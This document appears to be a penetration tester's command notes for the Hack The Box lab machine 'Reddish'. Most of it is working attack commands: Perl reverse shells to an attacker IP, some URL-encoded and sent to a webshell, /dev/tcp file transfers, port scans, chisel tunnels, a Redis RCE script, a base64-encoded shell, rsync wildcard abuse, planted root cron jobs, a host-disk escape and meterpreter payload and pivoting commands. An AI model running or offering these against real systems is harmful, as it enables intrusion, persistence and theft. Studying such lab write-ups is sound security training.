# Reddish-Notes

```bash
sed -i 's/$oldip/$newip/g' *-CMD-by-CMDs.md
```

```bash
# Get the id for /red/{id} 
curl -X POST http://$IP:1880


# Two is one and one is none
perl -e 'use Socket;$i="10.10.14.24";$p=8002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
# Listeners
rlwrap ncat -lvnp 800X

# file transfers
nc -lvnp 6969 <

bash -c "cat < /dev/tcp/10.10.14.24/6969 > /tmp/chisel"
bash -c "cat < /dev/tcp/10.10.14.24/6969 > /tmp/met"

# Meterpreter Practice
nohup ./met & 


# Network sweep
for i in $(seq 1 254); do (ping -c 1 172.$SUBNet.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
# Portscan
for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.19.0.3/$port && echo "open - $port") 2> /dev/null; done
# Further upgrade 
| tee -a subnet.txt
| tee -a $addr_ports.txt
# Or exfiltrate out `nc -lvnp 6969 > $file` where $file = $subnet.txt or $addr_ports.txt
 > /dev/tcp/10.10.14.24/6969


# Port Redirection - Remote Pivot
# Kali
./chisel server -p 10000 -reverse -v  
# Reddish
nohup ./chisel client 10.10.14.24:10000 R:127.0.0.1:6379:172.19.0.2:6379 &
nohup ./chisel client 10.10.14.24:10000 R:127.0.0.1:10002:172.19.0.3:80 &
# Chisel - Local Pivot -> www-data with Redis RCE
nohup ./chisel client 10.10.14.24:10000 10003:127.0.0.1:10003 &
nohup ./chisel client 10.10.14.24:10000 10004:127.0.0.1:10004 &
# Redis RCE to Webshell
./0xdfreddishRCE.sh

# www-data perl shell for url encoded 
# Not required for pre-encoding reuse purposes
perl -e 'use Socket;$i="172.19.0.4";$p=10003;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
# We need to url encode the quotes! x2 for 10003 and 10004
curl http://127.0.0.1:10002/8924d0549008565c554f8128cd11fda4/nvm.php -d 'cmd=perl+-e+%27use+Socket%3b$i%3d%22172.19.0.4%22%3b$p%3d10003%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22>%26S%22)%3bopen(STDOUT,%22>%26S%22)%3bopen(STDERR,%22>%26S%22)%3bexec(%22/bin/bash+-i%22)%3b}%3b%27' --output -

# www-data to Rsync Root shell
# Add another Chisel - Local Pivot on NodeRed for www-data -> rsync 
# rsync 
nohup ./chisel client 10.10.14.24:10000 10005:127.0.0.1:10005 &
# locally host rsync-rs
vim rsync-rs # :set paste [ENTER] i [SHIFT CTRL + V] && :wq
perl -e 'use Socket;$i="172.19.0.4";$p=10005;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
nc -lvnp 10005 < rsync-rs
bash -c "cat < /dev/tcp/172.19.0.4/10005 > /tmp/rsync-rs"
# Ctrl+C once transfered
rlwrap ncat -lvnp 10005

# Encode to base64 to copy
cat rsync-rs | base64 -w0
# On Backup Docker container
#  Copy at peril in section - beware the shell 
echo 
# EXAMPLE BELOW WARNING FOLLOW Previous steps
cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMyI7JHA9MTAwMDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIik7fTsnCg==
#
| base64 -d > /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/p.rdb

# Abuse rsync gtfobins with
touch /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ p.rdb
# make executable, check perms and check data:
chmod +x /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/*
ls -la /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/*
date

# post resync perl
# NodeRed:
nohup ./chisel client 10.10.14.24:10000 10006:127.0.0.1:10006 &
# Root rsync shell 
# Attack machine:
vim two-rs # :set paste [ENTER] i [SHIFT CTRL + V] && :wq
perl -e 'use Socket;$i="172.19.0.4";$p=10006;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
nc -lvnp 10006 < two-rs
bash -c "cat < /dev/tcp/172.19.0.4/10006 > /tmp/two-rs"
# Ctrl+C once transfered
rlwrap ncat -lvnp 10006
cd /tmp;
chown root:root *
chmod +x two-rs
nohup ./two-rs &

# File transfers for Post-Rsync
# Chisel Pivot for File Transfers initially and the a reverse shell - On NodeRed
nohup ./chisel client 10.10.14.24:10000 10007:127.0.0.1:10007 &
# Attack machine - for each: 
nc -lvnp 10007 < linpeas.sh
nc -lvnp 10007 < chisel
nc -lvnp 10007 < pspy64
# Ctrl+C once transfered
# Target Machine - for each:
bash -c "cat < /dev/tcp/172.19.0.4/10007 > /tmp/linpeas.sh"
bash -c "cat < /dev/tcp/172.19.0.4/10007 > /tmp/chisel"
bash -c "cat < /dev/tcp/172.19.0.4/10007 > /tmp/pspy64"
# Aaaaaaaaaaaaaawesome when this worked first

# Because we are cool create another two-rs named cron-esc and change the port number for the following backed-up cron 
# First start s listener on your host
rlwrap ncat -lvnp 10007
# Then on the www machine as Root
# Create a tunnel with chisel back to NodeRed client
# nodered = 10000 because the kali server is 10000 
nohup ./chisel client kali:10000 10007:127.0.0.1:10000 
# www - to open 10007 on kali
nohup ./chisel client 172.19.0.4:10007 10007:127.0.0.1:10007 &
chmod +x * /tmp/* 
cp two-rs cron-esc.s
sed -i 's/172.19.0.4/172.20.0.3/g' cron-esc.sh
sed -i 's/10006/10007/g' cron-esc.sh
rsync -a cron-esc.sh rsync://backup:873/src/tmp/
echo '* * * * * root bash /tmp/cron-esc.sh' > shell
rsync -a shell rsync://backup:873/src/etc/cron.d/

# Backup to Reddish 
# Just Rsync /tmp/* from www
rsync -a /tmp/chisel rsync://backup:873/src/tmp/
ls /dev/ | grep sda
mount /dev/sdaX /mnt
# Root Reddish to -> Kali
# Kali no chisel as we are on host
rlwrap ncat -lvnp 10008
# Backup
cp cron-esc.sh bigroot.sh
sed -i 's/cron-esc/bigroot/g' shell
sed -i 's/172.20.0.3/10.10.14.24/g' bigroot.sh
sed -i 's/10007/10008/g' bigroot.sh
cp bigroot.sh /mnt/tmp/
cp /etc/cron.d/shell /mnt/etc/cron.d/
```


#### Beyond Root
```bash
# Get the id for /red/{id} 
curl -X POST http://$IP:1880

# Met - 0xdf metasploit pivoting
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.24 LPORT=4444 -f elf -o met

msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.24; set LPORT 4444; run"

nc -lvnp 6969 < met


bash -c "cat < /dev/tcp/10.10.14.24/6969 > /tmp/met"
chmod +x met

# Relaying and Pivoting
# Exploit the RCE on redis
msf6 > sessions -i 1
meterpreter > portfwd add -l 10001 -r 172.19.0.2 -p 6379
meterpreter > portfwd add -l 10000 -r 172.19.0.3 -p 80

meterpreter > portfwd add -R -L tun0 -l 5555 -p 6666

# To list
meterpreter > portfwd list
# To remove all at once
meterpreter > portfwd flush

# To add
meterpreter > portfwd add -l 10000 -r 172.19.0.3 -p 80
# To delete
meterpreter > portfwd delete -l 10000 -r 172.19.0.3 -p 80

msf6 > route add 172.18.0.0 172.18.0.5 1
msf6 > route add 172.19.0.0 172.19.0.5 1



```

[Offensive Security Metasploit-Unleashed - portfwd ](https://www.offsec.com/metasploit-unleashed/portfwd/)
[Abed Samhuri @medium - How to Implement Pivoting and Relaying Techniques Using Meterpreter](https://medium.com/axon-technologies/how-to-implement-pivoting-and-relaying-techniques-using-meterpreter-b6f5ec666795)

Interesting extras
```ruby
msf > use auxiliary/scanner/portscan/tcp
# No linux arp but 
meterpreter > cat /proc/net/arp

# If was windows:
meterpreter > background
msf6 > use post/linux/window/arp_scanner
msf6 (arp_scanner) > set SESSION <id>
msf6 (arp_scanner) > set RHOSTS 192.168.0.0/24
msf6 (arp_scanner) > run
```